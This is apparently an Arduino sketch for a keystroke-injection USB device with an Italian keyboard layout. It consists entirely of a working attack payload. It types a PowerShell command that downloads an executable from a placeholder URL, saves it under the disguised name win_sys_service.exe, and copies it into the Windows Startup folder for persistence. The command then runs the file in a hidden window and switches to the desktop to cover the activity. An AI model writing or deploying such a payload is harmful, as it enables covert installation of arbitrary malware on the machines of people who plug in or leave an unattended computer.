#include "Keyboard.h"

void setup() { 
  Keyboard.begin(KeyboardLayout_it_IT);
  delay(500);
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.print("cmd");
  delay(50);
  Keyboard.press(KEY_RETURN);
  delay(10);
  Keyboard.release(KEY_RETURN); 
  delay(1000);
  Keyboard.print("powershell.exe -Command \"$url=\\\"<url_exe_da_iniettare>\\\";$out=\\\"$env:APPDATA\\win_sys_service.exe\\\";$startup=\\\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\win_sys_service.exe\\\";$ProgressPreference=\\\"SilentlyContinue\\\";(New-Object System.Net.WebClient).DownloadFile($url,$out);if(-not(Test-Path $startup)){Copy-Item $out $startup};Start-Process $out -WindowStyle Hidden\"&&exit\n");
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('d');
  Keyboard.releaseAll();
  Keyboard.end();
}

void loop() {}
